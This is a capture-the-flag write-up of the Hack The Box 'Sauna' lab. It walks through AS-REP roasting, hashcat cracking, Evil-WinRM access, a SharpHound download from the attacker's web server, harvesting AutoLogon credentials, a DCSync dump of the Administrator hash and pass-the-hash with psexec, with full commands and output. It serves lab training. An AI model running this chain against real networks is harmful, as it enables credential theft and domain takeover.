# Sauna - Ashbo3n

Starting with Nmap, Nmap is a tool used for Port Scanning:

```
PORT     STATE SERVICE        REASON          VERSION
53/tcp   open  domain?        syn-ack ttl 127
80/tcp   open  http           syn-ack ttl 127 Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec?  syn-ack ttl 127
135/tcp  open  msrpc?         syn-ack ttl 127
139/tcp  open  netbios-ssn?   syn-ack ttl 127
389/tcp  open  ldap?          syn-ack ttl 127
445/tcp  open  microsoft-ds?  syn-ack ttl 127
464/tcp  open  kpasswd5?      syn-ack ttl 127
593/tcp  open  ncacn_http     syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped     syn-ack ttl 127
3268/tcp open  globalcatLDAP? syn-ack ttl 127
3269/tcp open  tcpwrapped     syn-ack ttl 127
5985/tcp open  wsman?         syn-ack ttl 127
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-06T12:42:27
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52298/tcp): CLEAN (Timeout)
|   Check 2 (port 47313/tcp): CLEAN (Timeout)
|   Check 3 (port 52356/udp): CLEAN (Timeout)
|   Check 4 (port 59986/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

Port 80 is open so we will go port 80 first, we can see a website and going to /about.html in Meet The Team section we can see a list of names, we can use any AI or CeWL to generate usernames, I personally used Gemini, My list was this:

```
fsmith
hbear
skerb
scoins
btaylor
sdriver
fergus.smith
hugo.bear
steven.kerb
shaun.coins
bowie.taylor
sophie.driver
```

Don't forget to add: `SAUNA.EGOTISTICAL-BANK.LOCAL` `EGOTISTICAL-BANK.LOCAL` in /etc/hosts file.

Now we can check for AS-REP Roasting Attack, Command:

```
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile <Path To username file> -format hashcat -dc-ip <Target-Machine IP>
```

Output:

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ce8dbe54688391db8d2cb6831cac76e9$159dcae8b2d1cedcc594d9656f4cdc221b1f13e040931a449df983324a987b8faf0fbe3fadcf91b9129379ed25a14aa2e041e83987b596479169fefa816cb7e1770ed157b8674049c1e47e0c5de5e992c4117cc0b0eb1104210519eab7a3d805a1d2bf5d6e6216071f25376be72ff329953cb8324c720c2d4703f005fd8fc5aaa1c5b8bd4a9ca951f26f148984e85fc59285614e4c711dd58c413866e7eed48568c9ab5ab114cf817c6334ba4c0e65a89e16548d2a14446773d9ffb1440f4bab890e2dba760377ac8e9dc4e3e5fa2440131dc919bb0b1220afc6b2a8147776e7eab264e12e4f09e382c43c357399a4c2e7a15223f8d9da98a07f1cfc8932e4cd
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
<SNIP>
```

Now we can decode it using Hashcat, First save hash into Hash.txt and run this command:

```
hashcat -m 18200 <Path-To-Hash> <Path-To-Rockyou.txt>
```

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ba19da510533c259293c002885f0d7df$fedff419e9932d6c43875784b0e2ea7ba8af7b9136a36d79e13e32fea83d6ed5a29b05769a14bb5bd474e6d0c0cccff8df17735c9fea57032a4dff35f0bd1f818dcae032268c3d9525f4a43d5cbc59c109b19a02d0ae267b9818595d94a6475891cc704a58b14b0c7f19105e4f1c59d08304a9633b7624f9cb2f90a986e7346b29acd8cc51cbe928ce470d1b3b971269f6524c2719fa54ba40207774c5d5ff0eb21861b41d7be9bc2092bf6de6d0deddca19abb3afce011e606260d0a130ca74ea46d3a96ca46458a7665b82816f6fcea387a107400466d522084a1d8ca382f6a851ae87e6e7ebe8113d0a46b8880a6e7d234764e005916f9914265c2019922a:Thestrokes23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ba19da5...19922a
Time.Started.....: Fri Mar  6 01:10:28 2026 (4 secs)
<SNIP>
```

```
┌──(Ash㉿kali)-[~/HTB/Easy/Sauna/Hashes]
└─$ hashcat -m 18200 Hash.txt ~/Wordlists/rockyou.txt --show
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ba19da510533c259293c002885f0d7df$fedff419e9932d6c43875784b0e2ea7ba8af7b9136a36d79e13e32fea83d6ed5a29b05769a14bb5bd474e6d0c0cccff8df17735c9fea57032a4dff35f0bd1f818dcae032268c3d9525f4a43d5cbc59c109b19a02d0ae267b9818595d94a6475891cc704a58b14b0c7f19105e4f1c59d08304a9633b7624f9cb2f90a986e7346b29acd8cc51cbe928ce470d1b3b971269f6524c2719fa54ba40207774c5d5ff0eb21861b41d7be9bc2092bf6de6d0deddca19abb3afce011e606260d0a130ca74ea46d3a96ca46458a7665b82816f6fcea387a107400466d522084a1d8ca382f6a851ae87e6e7ebe8113d0a46b8880a6e7d234764e005916f9914265c2019922a:Thestrokes23
```

We can now log in with Evil-WinRM, Command:

```
evil-winrm -i <Target-IP> -u fsmith -p Thestrokes23
```

And we can view the flag with the command:

```
cat C:\Users\FSmith\Desktop\user.txt
```

### Privilege Escalation

Let's transfer SharpHound.ps1 in windows, First in your attacking machine start the python server in the dir where your SharpHound.ps1 is located, if you don't have it you can download it from Github, after starting the webserver and returning to evil-winrm we can use this wget command to download it:

```
wget -Uri http://[Your-Tun0-IP]:[Web-Server-port]/SharpHound.ps1 -OutFile SharpHound.ps1
```

And then run it with `. ./SharpHound.ps1` And Invoke BloodHound:

```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\FSmith\Downloads
```

After the command dir should contain .zip file, like this:

```
-a----         3/6/2026   6:19 AM          30581 20260306061933_BloodHound.zip
```

If we use Winpeas on the target machine we can see default username and password for svc\_loanmanager:

```
 Looking for AutoLogon credentials                                                                                  
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK                                                                
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager                      
    DefaultPassword               :  Moneymakestheworldgoround!                            
                                                      
```

Now we can log in as svc\_loanmgr with evil\_winrm:

```
evil-winrm -i 10.129.17.202 -u svc_loanmgr -p 'Moneymakestheworldgoround!' 
```

Now that we have access to svc\_loanmgr, we can open blood hound and map it to see path to admin:

[![image.png](http://localhost:4444/uploads/images/gallery/2026-03/scaled-1680-/7t0image.png)](http://localhost:4444/uploads/images/gallery/2026-03/7t0image.png)

Which tells us it is a DCSync attack (For some reason Image may not be visible), so on our attacking machine let's run this command:

```
                                                                                                                                                                                                                                   
┌──(Ash㉿kali)-[~/HTB/Easy/Sauna]
└─$ impacket-secretsdump egotistical-bank/svc_loanmgr@10.129.17.202 -just-dc-user Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up... 
                                                                                                                                                                                                                                         
┌──(Ash㉿kali)-[~/HTB/Easy/Sauna]
└─$ 


```

And log in using psexec:

```
impacket-psexec egotistical-bank.local/administrator@[Target-IP] -hashes :823452073d75b9d1cf70ebdf86c7f98e
```

Root flag can be viewed with the command:

```
type C:\Users\Administrator\Desktop\root.txt
```
